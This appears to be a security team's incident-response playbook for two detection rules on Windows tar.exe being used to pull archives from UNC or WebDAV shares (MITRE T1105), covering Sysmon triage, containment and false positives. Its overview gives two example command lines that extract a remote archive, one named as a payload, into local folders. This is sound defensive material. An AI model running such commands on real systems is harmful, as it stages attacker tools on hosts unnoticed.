# T1105 — Ingress Tool Transfer · LOLBin: tar.exe (BSDTar on Windows)
**Rules Covered:**  
- CNC-E-2726320-188 — TAR Ingress via UNC or WebDAV (Process Creation)  
- CNC-E-2726320-189 — TAR Outbound to SMB or WebDAV (Sysmon EID 3/22)  
**Last updated:** 2025-10-28 16:32 UTC

> Windows ships a `tar.exe` (BSDTar) that can **extract from remote archives** when the source is a **UNC** or **WebDAV** path.  
> Adversaries can stage payloads by fetching `*.tar`/`*.tar.gz`/`*.tgz`/`*.zip` archives from **network locations** and extracting them into sensitive paths,
> blending with admin automation. This supports **T1105 — Ingress Tool Transfer** under a trusted system binary.

---

## Playbook 1 — TAR Ingress via UNC or WebDAV (Process Creation)

### Overview
Investigate **process creation** where `tar.exe` is launched with a **remote source archive** and/or a **destination directory** on the local host, e.g.:
- `tar -xvf \\server\share\tools.tgz -C C:\ProgramData\`  
- `tar -xvf \\host@SSL\DavWWWRoot\drop\payload.tar.gz -C C:\Users\Public\` (WebDAV over HTTPS)

Such usage indicates that a **network-hosted archive** is being **extracted locally**, a common staging step in ingress transfer chains.

### Initial Response
1. **Preserve context:** Export **Sysmon EID 1 / Security 4688** with `Image`, full `CommandLine`, `ParentImage`, `User`, integrity level, CWD, timestamp.  
2. **Parse paths & switches:** Identify the **archive source** (UNC/WebDAV), compression flags (`-z` for gzip implied via `.gz/.tgz`), and **target** via `-C`.  
3. **Secure artifacts:** Snapshot the **target directory**; list, copy & **hash** files created within ±10 minutes; capture pre/post directory listings.

### Investigation Steps
#### 1) Process & Lineage
- Validate binary location/signature (typically `C:\\Windows\\System32\\tar.exe`).  
- Review **parent** (PowerShell/cmd/CS tools/RMM, scheduled task, MSI custom actions) and execution context.  
- Check for **off‑hours** execution or runs on non‑admin workstations/servers where unusual.

#### 2) Command‑Line Semantics
- Note use of: `-x` (extract), `-v` (verbose), `-f` (file), `-C` (directory), and wildcards.  
- Inspect **destination path** for sensitive locations (`System32`, `Program Files`, `C:\ProgramData`, user startup, service directories).  
- For **WebDAV** (`@SSL\DavWWWRoot`), downloads may be brokered by **WebClient** (`svchost.exe`) on **80/443**.

#### 3) Network & DNS
- Correlate **Sysmon EID 3** for SMB(445)/WebDAV(80/443) egress attributed to `tar.exe` or helper processes; review **proxy** logs for URL/SNI, method/status/bytes.  
- Use **Sysmon EID 22** for DNS lookups; in explicit proxy, expect the **proxy FQDN** on the endpoint rather than the upstream host.

#### 4) Artifact & Execution
- Review **Sysmon EID 11** for file creations in the target; check **Zone.Identifier** ADS and extension↔MIME mismatches.  
- Hunt for **follow‑on execution**: child processes (EDR timeline), new services/tasks referencing extracted files, module loads from the target path.

#### 5) Fleet Correlation
- Pivot by **archive name**, **source host/share**, **hashes** of extracted artifacts, and **CLI fragments** (`-C`, `DavWWWRoot`) across endpoints.

### Key Artifacts
- **Sysmon EID 1 / 4688:** Process creation with full CLI & parent.  
- **Sysmon EID 11:** Extracted files written to the target path.  
- **Sysmon EID 3 / Proxy:** SMB/WebDAV egress to remote source.  
- **Sysmon EID 22:** DNS aligned with the event.

### Containment Actions
- **Block** source hosts; **quarantine** extracted payloads; **terminate** related processes; consider **host isolation** if execution occurred.

### Prevention Measures
- Egress filtering; disable **WebClient** if not required; restrict `tar.exe` to admin contexts via **AppLocker/WDAC**.  
- Monitor for `tar.exe` writing into **system/service** directories; baseline legitimate automation.

### Recovery
- Remove staged artifacts/persistence; restore target directories from baseline; tune detections and allowlists.

### False Positives
- Admin automation pulling archives from **approved intranet** shares for software deployment; validate by change tickets and allowlist.

---

## Playbook 2 — TAR Outbound to SMB or WebDAV (Sysmon EID 3/22)

### Overview
Investigate **network/DNS activity** tied to `tar.exe`. The tool itself is a local archiver; **network egress** implies fetching archives from **UNC or WebDAV** sources
during extraction (T1105 staging).

### Initial Response
1. **Capture records:** Export **Sysmon EID 3** (dest IP/host/port/proto) and **Sysmon EID 22** (DNS queries) for the same time window; correlate with **EID 1/4688**.  
2. **Classify destination:** Internal vs external; flag **raw IPs**, **new/rare domains**, **non‑standard ports**.  
3. **Scope usage:** Determine if the asset normally uses `tar.exe` for deployments; review recent change windows.

### Investigation Steps
#### 1) Process & Command Context
- Retrieve full **command line** of `tar.exe`; confirm **remote source** and **target directory** (`-C`).  
- Inspect **parent** process and user context (service account vs interactive user).

#### 2) Destination Validation
- For **SMB**, validate sessions on **445** and enumerate the exact share & path accessed.  
- For **WebDAV**, pivot to **WebClient** telemetry and **proxy** logs for the URL and transfer size/status.

#### 3) Artifact Discovery
- Inspect **EID 11** for file creation in target directories; **hash** and analyze; check for **executables/scripts** or **scheduled tasks** referencing them.  
- Look for **child processes** spawned shortly after extraction.

#### 4) Correlation & Fleet
- Pivot by **destinations**, **archive names**, **hashes**, and **parent** to detect coordinated staging across hosts.

### Key Artifacts
- **Sysmon EID 3 / 22:** Network and DNS observables (or proxy FQDN in explicit proxy).  
- **Sysmon EID 1 / 4688:** Process creation context.  
- **Sysmon EID 11:** File writes from extraction.  
- **EDR timeline:** Child processes / module loads from extracted paths.

### Containment Actions
- **Block** endpoints; **quarantine** extracted payloads; **terminate** chains; consider **host isolation** if execution is indicated.

### Prevention Measures
- Limit `tar.exe` usage to approved admin tasks; enforce **egress controls**; alert on **Internet‑zone** sources and sensitive target paths.  
- Monitor for `tar.exe` with `-C` into **ProgramData/system** locations on user endpoints.

### Recovery
- Remove artifacts/persistence; validate integrity of affected directories; tune detections and allowlists.

### False Positives
- Legitimate deployments using `tar.exe` to extract packages from sanctioned intranet shares or mirrors; verify via tickets and allowlist as needed.